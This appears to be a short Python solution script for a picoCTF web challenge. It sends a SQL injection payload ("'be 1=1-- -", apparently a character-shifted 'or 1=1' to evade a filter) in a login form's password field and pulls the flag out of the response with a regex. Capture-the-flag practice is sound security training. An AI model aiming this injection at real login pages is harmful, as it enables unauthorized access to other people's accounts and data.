import requests
import re

url = "https://jupiter.challenges.picoctf.org/problem/54253/login.php"
payload = {"password": "'be 1=1-- -", "debug": "0"}
r = requests.post(url, data=payload)
flag = re.findall(r'picoCTF{.*?}', r.text)[0]
print(flag)
